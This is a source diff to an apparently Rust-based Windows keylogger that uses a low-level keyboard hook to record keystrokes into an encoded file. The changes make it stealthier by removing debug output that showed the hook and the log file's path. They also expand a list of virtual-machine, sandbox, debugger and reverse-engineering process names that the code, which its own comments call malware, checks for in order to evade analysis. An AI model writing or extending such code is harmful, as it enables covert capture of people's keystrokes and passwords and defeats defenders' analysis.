@@ -146,8 +146,6 @@ pub unsafe fn set_windows_hook(){
         //the hook that will be used
         let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_callback), None, 0).unwrap();
 
-        println!("[Debugging] Hook is now listenting");
-
         let mut msg = MSG::default();
 
         // This keeps the thread alive to receive hook messages
@@ -176,7 +174,7 @@ extern "system" fn keyboard_callback(code: i32, wparam: WPARAM, lparam: LPARAM) 
         //vkcode of the button
         let vk_code = kb_struct.vkCode;
 
-        println!("[Debugging] Key event: vkCode = {}, wParam = {}", vk_code, wparam.0);
+        // println!("[Debugging] Key event: vkCode = {}, wParam = {}", vk_code, wparam.0);
         
         //first checks if VK code is speical button and then convert
         //if not make it into a normal char
@@ -265,9 +263,6 @@ fn write_into_file(button_pressed:& str){
 pub fn read_file() -> String{
 
     let mut dec = ENCODER.lock().unwrap();
-
-    //displays where the keylogging file is
-    println!("{}",KEYLOGGING_FILE.display());
     
     //rest the key for decoding
     dec.reset_key();
@@ -312,7 +307,62 @@ pub fn delete_file(){
 pub fn check_for_analysis_behaviour(){
 
     //malware
-    let warry_process:Vec<String> = vec!["vboxservice.exe", "vmtoolsd.exe","wireshark.exe", "procmon.exe", "ollydbg.exe","x64dbg.exe"].into_iter().map(String::from).collect();
+    let warry_process:Vec<String> = vec![
+    // VirtualBox-related
+    "vboxservice.exe",
+    "vboxtray.exe",
+    "vboxclient.exe",
+    "VBoxControl.exe",
+    
+    // VMware-related
+    "vmtoolsd.exe",
+    "vmwaretray.exe",
+    "vmwareuser.exe",
+    "vmacthlp.exe",
+    "VGAuthService.exe",
+    "vmusbmouse.exe",
+    "vmrawdsk.sys",
+    
+    // QEMU-related
+    "qemu-ga.exe",
+    "qemuw.exe",
+
+    // Parallels-related
+    "prl_cc.exe",
+    "prl_tools.exe",
+    "prl_srv.exe",
+
+    // Analysis tools
+    "wireshark.exe",
+    "procmon.exe",
+    "procexp.exe",
+    "tcpview.exe",
+    "autoruns.exe",
+    "filemon.exe",
+    "regmon.exe",
+    "dependencywalker.exe",
+
+    // Debuggers
+    "ollydbg.exe",
+    "x64dbg.exe",
+    "ida.exe",
+    "ida64.exe",
+    "windbg.exe",
+    "dbgview.exe",
+    "ImmunityDebugger.exe",
+
+    // Sandbox indicators
+    "sandboxie.exe",
+    "cuckoo.exe",
+    "joeboxcontrol.exe",
+
+    // Reverse engineering & monitoring
+    "fiddler.exe",
+    "dnspy.exe",
+    "hxd.exe",
+    "cheatengine.exe",
+    "resourcehacker.exe",
+    ].into_iter().map(String::from).collect();
 
     //if malware is a part of a debugger, exit
     if check_for_debugging(){
